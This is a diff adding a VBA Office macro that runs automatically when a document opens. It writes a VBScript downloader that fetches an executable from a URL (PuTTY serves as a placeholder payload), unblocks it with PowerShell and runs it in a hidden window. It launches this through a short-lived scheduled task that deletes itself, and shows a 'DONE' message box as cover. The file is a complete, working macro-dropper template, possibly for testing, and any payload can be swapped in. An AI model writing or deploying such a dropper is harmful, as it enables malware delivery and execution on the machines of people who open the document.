@@ -1,0 +1,165 @@
+Sub AutoOpen()
+
+    worker
+    coverture
+    
+End Sub
+
+Sub coverture()
+    
+    MsgBox "DONE"
+    
+End Sub
+
+
+Sub BuildFullPath(ByVal FullPath)
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FolderExists(FullPath) Then
+    BuildFullPath fso.GetParentFolderName(FullPath)
+    fso.CreateFolder FullPath
+    End If
+End Sub
+
+
+Sub worker()
+
+'--------------------------------------------------------------------------------
+' SET variables    
+
+    Dim DIRECTORY As String
+    Dim PYL_URL As String
+    Dim AGENT_NAME As String
+    Dim SCRIPT_NAME As String
+    Dim TASK_NAME As String
+
+    DIRECTORY = "C:\Users\user\Desktop\TEST\"
+    PYL_URL = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
+    AGENT_NAME = "test.exe"
+    SCRIPT_NAME = "wget.vbs"
+    TASK_NAME = "AGENT"
+
+'--------------------------------------------------------------------------------
+' Create Directory    
+
+    On Error Resume Next
+    MkDir (DIRECTORY)
+
+    BuildFullPath DIRECTORY
+
+'--------------------------------------------------------------------------------
+' Build script
+
+    Dim fso1 As Object
+    Set fso1 = CreateObject("Scripting.FileSystemObject")
+    Dim oFile1 As Object
+    Set oFile1 = fso1.CreateTextFile( DIRECTORY & SCRIPT_NAME)
+
+    oFile1.WriteLine "On Error Resume Next"
+    oFile1.WriteLine     
+    oFile1.WriteLine "strUrl = " & Chr(34) & PYL_URL & Chr(34) & "
+    oFile1.WriteLine "StrFile = " & Chr(34) & DIRECTORY & AGENT_NAME & Chr(34) & "
+    oFile1.WriteLine     
+    oFile1.WriteLine     
+    oFile1.WriteLine "URL = strUrl"
+    oFile1.WriteLine "saveTo = StrFile"
+    oFile1.WriteLine     
+    oFile1.WriteLine "'if WScript.Arguments.Count < 1 then"
+    oFile1.WriteLine "'  MsgBox " & Chr(34) & "Usage: wget.vbs <url> (file)" & Chr(34) & ""
+    oFile1.WriteLine "'  WScript.Quit"
+    oFile1.WriteLine "'end if"
+    oFile1.WriteLine     
+    oFile1.WriteLine "'URL = WScript.Arguments(0)"
+    oFile1.WriteLine "'if WScript.Arguments.Count > 1 then"
+    oFile1.WriteLine "'  saveTo = WScript.Arguments(1)" & Chr(34) & "
+    oFile1.WriteLine "'else"
+    oFile1.WriteLine "'  parts = split(url," & Chr(34) & "/" & Chr(34) & ")"
+    oFile1.WriteLine "'  saveTo = parts(ubound(parts))"
+    oFile1.WriteLine "'end if"
+    oFile1.WriteLine     
+    oFile1.WriteLine     
+    oFile1.WriteLine "'------------------------------------------------------------"
+    oFile1.WriteLine "' Wget"
+    oFile1.WriteLine     
+    oFile1.WriteLine "Set objXMLHTTP = CreateObject(" & Chr(34) & "MSXML2.ServerXMLHTTP" & Chr(34) & ")"
+    oFile1.WriteLine     
+    oFile1.WriteLine "objXMLHTTP.open " & Chr(34) & "GET" & Chr(34) & ", URL, false"
+    oFile1.WriteLine "objXMLHTTP.send()"
+    oFile1.WriteLine "
+    oFile1.WriteLine "If objXMLHTTP.Status = 200 Then"
+    oFile1.WriteLine "Set objADOStream = CreateObject(" & Chr(34) & "ADODB.Stream" & Chr(34) & ")"
+    oFile1.WriteLine "objADOStream.Open"
+    oFile1.WriteLine "objADOStream.Type = 1 'adTypeBinary"
+    oFile1.WriteLine     
+    oFile1.WriteLine "objADOStream.Write objXMLHTTP.ResponseBody"
+    oFile1.WriteLine "objADOStream.Position = 0    'Set the stream position to the start"
+    oFile1.WriteLine     
+    oFile1.WriteLine "Set objFSO = Createobject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
+    oFile1.WriteLine "If objFSO.Fileexists(saveTo) Then objFSO.DeleteFile saveTo"
+    oFile1.WriteLine "Set objFSO = Nothing"
+    oFile1.WriteLine     
+    oFile1.WriteLine "objADOStream.SaveToFile saveTo"
+    oFile1.WriteLine "objADOStream.Close"
+    oFile1.WriteLine "Set objADOStream = Nothing"
+    oFile1.WriteLine "End if"
+    oFile1.WriteLine     
+    oFile1.WriteLine "Set objXMLHTTP = Nothing"
+    oFile1.WriteLine     
+    oFile1.WriteLine     
+    oFile1.WriteLine     
+    oFile1.WriteLine "'------------------------------------------------------------"
+    oFile1.WriteLine "' Execute"
+    oFile1.WriteLine     
+    oFile1.WriteLine "Set oShell = CreateObject (" & Chr(34) & "Wscript.Shell" & Chr(34) & ")"
+    oFile1.WriteLine "Dim cmd1"
+    oFile1.WriteLine "Dim cmd2"
+    oFile1.WriteLine "Dim cmd3"
+    oFile1.WriteLine     
+    oFile1.WriteLine "cmd1 = " & Chr(34) & "powershell.exe -noprofile -command unblock-file -path " & Chr(34) & " & StrFile"
+    oFile1.WriteLine "oShell.Run cmd1, 0, false"
+    oFile1.WriteLine     
+    oFile1.WriteLine "cmd2 = StrFile"
+    oFile1.WriteLine "oShell.Run cmd2, 0, false"
+    oFile1.WriteLine     
+    oFile1.WriteLine "cmd3 = " & Chr(34) & "schtasks /delete /TN " & TASK_NAME & " /F" & Chr(34) & "
+    oFile1.WriteLine "oShell.Run cmd3, 0, false"
+    oFile1.WriteLine     
+    oFile1.WriteLine     
+    oFile1.WriteLine "' Done"
+    oFile1.WriteLine "WScript.Quit"
+
+    oFile1.Close
+    Set fso1 = Nothing
+    Set oFile1 = Nothing
+
+
+'--------------------------------------------------------------------------------
+' Creating cronjob
+
+    
+    Dim shiftedDate As Date
+    Dim shiftedHour As String
+    Dim shiftedMinute As String
+    Dim runTime As String
+    
+    shiftedDate = DateAdd("n", 2, Now())
+    shiftedHour = Format(shiftedDate, "hh")
+    shiftedMinute = Format(shiftedDate, "nn")
+    runTime = shiftedHour & ":" & shiftedMinute
+
+    Set oShell = CreateObject("Wscript.Shell")
+    Dim command1
+    Dim command2
+    Dim command3
+
+    command1 = "schtasks /delete /TN " & TASK_NAME & " /F"
+    oShell.Run command1, 0, False
+
+    command2 = "schtasks /create /SC ONCE /TN " & TASK_NAME & " /TR " & DIRECTORY & SCRIPT_NAME & " /ST " & runTime & " /F"
+    oShell.Run command2, 0, False
+
+    command3 = "powershell.exe -noprofile -command unblock-file -path " & DIRECTORY & SCRIPT_NAME
+    oShell.Run command3, 0, False
+
+    'schtasks /query /TN AGENT
+
+End Sub
